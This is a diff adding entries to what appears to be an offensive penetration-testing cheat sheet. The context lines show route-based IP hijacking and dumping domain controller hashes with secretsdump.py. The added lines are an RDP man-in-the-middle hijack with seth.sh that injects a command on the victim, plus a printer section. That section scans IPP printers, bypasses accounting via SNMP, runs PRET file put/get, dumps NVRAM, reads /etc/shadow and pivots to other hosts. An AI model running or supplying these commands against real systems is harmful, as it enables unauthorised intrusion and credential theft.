@@ -293,6 +293,8 @@ ip route add 65.x.101.x/32 via 0.0.0.0 dev lo:1
 
 # mitm dns or ftp or ssh?
 # use hijacked ip to bypass pfsense?
+# hijack rdp?
+seth.sh <INTERFACE> <ATTACKERIP> <RDPVICTIMIP> <GATEWAYIP> "cmd /c oneliner"
 
 # restore traffic locally 
 ifconfig lo:1 127.0.0.2
@@ -590,6 +592,36 @@ export KRB5CCNAME=<CACHEOFTGT>
 
 # dump dc using tgt (use domain admin ntlm hash etc...)
 proxychains secretsdump.py -outputfile <DCFQDN>_hashes -k <DCFQDN> -just-dc;
+```
+
+###### PRINTERS
+```txt
+# discover ipprinters
+proxychains pret.py
+proxychains nmap -v -sT -p631 -sV -oA <NETWORK>_ippscan --open <NETWORK/CIDR>
+
+# initial access to ipprinter, accounting bypass (CUPS CVE?)
+proxychains pret.py <IP> pjl
+proxychains snmpset -v1 -c public <IP> 1.3.6.1.2.1.43.5.1.1.3.1 i 6
+
+# enumeration, generic commands etc.. 
+> env
+> ls ../../
+> put <LFILE>
+> get <RFILE>
+> info config  
+> info memory
+
+# troll team display message?
+> display "FUNNY MESSAGE ETC"
+
+# loot memory, fs (sensitive data, creds, etc..)
+> unlock
+> nvram dump 
+> get /etc/shadow
+
+# pivot ?
+> open <OTHERIP>
 ```
 
 ###### LATERAL MOVEMENT
